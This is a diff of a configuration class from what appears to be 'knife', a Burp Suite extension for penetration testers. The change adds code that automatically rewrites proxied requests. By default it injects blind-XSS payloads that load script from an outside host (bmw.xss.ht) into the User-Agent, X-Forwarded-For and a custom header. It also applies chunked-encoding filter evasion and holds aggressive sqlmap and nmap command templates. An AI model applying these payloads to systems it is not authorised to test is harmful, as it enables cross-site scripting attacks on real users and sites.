@@ -1,15 +1,22 @@
 package config;
 
 import java.io.PrintWriter;
+import java.io.UnsupportedEncodingException;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.HashSet;
 import java.util.List;
 import java.util.Set;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
 import javax.swing.table.AbstractTableModel;
 
 import burp.BurpExtender;
+import burp.HelperPlus;
+import burp.IExtensionHelpers;
+import burp.IHttpRequestResponse;
+import burp.Methods;
 import burp.Utils;
 
 
@@ -24,15 +31,15 @@ public class ConfigTableModel extends AbstractTableModel{
 	private static final String[] titles = new String[] {
 			"Key", "Value", "Type", "Enable", "Comment"
 	};
-	
+
 	public static final String Firefox_Mac = "/Applications/Firefox.app/Contents/MacOS/firefox";
 	public static final String Firefox_Windows = "D:\\Program Files\\Mozilla Firefox\\firefox.exe";
-	
+
 	// /usr/local/bin 本地默认可执行文件路径
 	public static final String SQLMap_Command = "python /usr/local/bin/sqlmap-dev/sqlmap.py -r {request.txt} --force-ssl --risk=3 --level=3";
 	public static final String Nmap_Command = "nmap -Pn -sT -sV --min-rtt-timeout 1ms "
 			+ "--max-rtt-timeout 1000ms --max-retries 0 --max-scan-delay 0 --min-rate 3000 {host}";
-	
+
 	public ConfigTableModel(){
 
 		configEntries.add(new ConfigEntry("Put_MenuItems_In_One_Menu", "",ConfigEntry.Config_Basic_Variable,false,false));
@@ -62,8 +69,8 @@ public class ConfigTableModel extends AbstractTableModel{
 		configEntries.add(new ConfigEntry("Chunked-AutoEnable", "",ConfigEntry.Config_Chunked_Variable,false,false));
 		configEntries.add(new ConfigEntry("Chunked-UseComment", "",ConfigEntry.Config_Chunked_Variable,true,false));
 
-		configEntries.add(new ConfigEntry("Proxy-ServerList", "127.0.0.1:8888;127.0.0.1:9999;",ConfigEntry.Config_Proxy_Variable,false,false));
-		configEntries.add(new ConfigEntry("Proxy-UseRandomMode", "",ConfigEntry.Config_Proxy_Variable,true,false));
+		//configEntries.add(new ConfigEntry("Proxy-ServerList", "127.0.0.1:8888;127.0.0.1:9999;",ConfigEntry.Config_Proxy_Variable,false,false));
+		//configEntries.add(new ConfigEntry("Proxy-UseRandomMode", "",ConfigEntry.Config_Proxy_Variable,true,false));
 		//以上都是固定基础变量，不需要修改名称和类型
 
 		configEntries.add(new ConfigEntry("Last-Modified", "",ConfigEntry.Action_Remove_From_Headers,true));
@@ -71,7 +78,7 @@ public class ConfigTableModel extends AbstractTableModel{
 		configEntries.add(new ConfigEntry("If-None-Match", "",ConfigEntry.Action_Remove_From_Headers,true));
 
 		configEntries.add(new ConfigEntry("X-Forwarded-For", "'\\\"><sCRiPt/src=//bmw.xss.ht>",ConfigEntry.Action_Add_Or_Replace_Header,true));
-//		//避免IP:port的切分操作，把Payload破坏，所以使用不带分号的简洁Payload
+		//		//避免IP:port的切分操作，把Payload破坏，所以使用不带分号的简洁Payload
 		configEntries.add(new ConfigEntry("User-Agent", "'\\\"/><script src=https://bmw.xss.ht></script><img/src=%dnslogserver/%host>",ConfigEntry.Action_Append_To_header_value,true));
 		configEntries.add(new ConfigEntry("knife", "'\\\"/><script src=https://bmw.xss.ht></script><img/src=%dnslogserver/%host>",ConfigEntry.Action_Add_Or_Replace_Header,true));
 
@@ -298,7 +305,7 @@ public class ConfigTableModel extends AbstractTableModel{
 				ConfigEntry config = configEntries.get(rows[i]);
 				String key = config.getKey();
 				updateConflictItem(key);//如果存在冲突值，更新
-				
+
 				configEntries.remove(rows[i]);
 				stdout1.println("!!! "+key+" deleted");
 				this.fireTableRowsDeleted(rows[i], rows[i]);
@@ -306,7 +313,7 @@ public class ConfigTableModel extends AbstractTableModel{
 		}
 
 	}
-	
+
 	public void updateConflictItem(String key) {
 		for (ConfigEntry item:configEntries){
 			String keytmp = item.getKey();
@@ -340,5 +347,89 @@ public class ConfigTableModel extends AbstractTableModel{
 
 	public void setConfigEntries(List<ConfigEntry> configEntries) {
 		this.configEntries = configEntries;
+	}
+
+	/**
+	 * 根据GUI中配置，修改数据包
+	 * @param messageIsRequest
+	 * @param messageInfo
+	 * @return
+	 */
+	public boolean checkConfigAndTakeAction( boolean messageIsRequest, IHttpRequestResponse messageInfo) {
+		IExtensionHelpers helpers = BurpExtender.getCallbacks().getHelpers();
+		HelperPlus getter = new HelperPlus(helpers);
+
+		byte[] oldRequest = messageInfo.getRequest();
+
+		String host = HelperPlus.getHost(messageInfo);
+
+		//remove header
+		List<ConfigEntry> configEntries = getConfigByType(ConfigEntry.Action_Remove_From_Headers);
+		for (ConfigEntry entry : configEntries) {
+			String key = entry.getKey();
+			getter.removeHeader(messageIsRequest, messageInfo, key);
+		}
+
+		//add/update/append header
+		List<ConfigEntry> updateOrAddEntries = getConfigEntries();
+		for (ConfigEntry entry : updateOrAddEntries) {
+			String key = entry.getKey();
+			String value = entry.getValue();
+
+			if (value.contains("%host")) {
+				value = value.replaceAll("%host", host);
+				//stdout.println("3333"+value);
+			}
+
+			if (value.toLowerCase().contains("%dnslogserver")) {
+				String dnslog = getConfigValueByKey("DNSlogServer");
+				Pattern p = Pattern.compile("(?u)%dnslogserver");
+				Matcher m = p.matcher(value);
+
+				while (m.find()) {
+					String found = m.group(0);
+					value = value.replaceAll(found, dnslog);
+				}
+			}
+
+			if (entry.getType().equals(ConfigEntry.Action_Add_Or_Replace_Header) && entry.isEnable()) {
+				getter.addOrUpdateHeader(messageIsRequest, messageInfo, key, value);
+
+			} else if (entry.getType().equals(ConfigEntry.Action_Append_To_header_value) && entry.isEnable()) {
+				String oldValue = getter.getHeaderValueOf(messageIsRequest, messageInfo, key);
+				if (oldValue == null) {
+					oldValue = "";
+				}
+				value = oldValue + value;
+				getter.addOrUpdateHeader(messageIsRequest, messageInfo, key, value);
+			} else if (entry.getKey().equalsIgnoreCase("Chunked-AutoEnable") && entry.isEnable()) {
+				getter.addOrUpdateHeader(messageIsRequest, messageInfo,"Transfer-Encoding", " chunked");
+				byte[] oldBody = getter.getBody(messageIsRequest, messageInfo);
+				try {
+					boolean useComment = false;
+					if (getConfigValueByKey("Chunked-UseComment") != null) {
+						useComment = true;
+					}
+					String lenStr = getConfigValueByKey("Chunked-Length");
+					int len = 10;
+					if (lenStr != null) {
+						len = Integer.parseInt(lenStr);
+					}
+					byte[] body = Methods.encoding(oldBody, len, useComment);
+					getter.UpdateBody(messageIsRequest, messageInfo, body);
+				} catch (UnsupportedEncodingException e) {
+					BurpExtender.getStderr().print(e.getStackTrace());
+				}
+			}
+		}
+
+		byte[] newRequest = messageInfo.getRequest();
+
+		if (Arrays.equals(newRequest,oldRequest)){
+			//https://stackoverflow.com/questions/9499560/how-to-compare-the-java-byte-array
+			messageInfo.setComment("auto changed by knife");
+			return true;
+		}
+		return false;
 	}
 }
